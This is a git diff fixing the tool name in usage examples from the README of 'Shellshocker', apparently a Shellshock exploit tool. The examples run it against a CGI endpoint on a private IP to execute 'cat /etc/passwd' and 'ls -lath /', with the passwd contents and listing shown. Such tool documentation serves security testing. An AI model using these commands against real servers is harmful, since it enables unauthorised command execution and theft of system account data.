@@ -19,7 +19,7 @@ Shellshocker suggests to avoid user-agent spoofing on-hand. In contrast to that 
 
 ### Examples:
 ```sh
-/.../shellshoker$ python shellshoker.py http://10.0.0.12:591/cgi-bin/cat
+/.../shellshocker python shellshocker.py http://10.0.0.12:591/cgi-bin/cat
 Shellshock Command: cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -47,7 +47,7 @@ apophis:x:501:502::/home/apophis:/bin/bash
 ```
 
 ```sh
-/.../shellshoker$ python shellshoker.py http://10.0.0.12:591/cgi-bin/cat
+/.../shellshocker python shellshocker.py http://10.0.0.12:591/cgi-bin/cat
 Shellshock Command: ls -lath /
 
 total 101K
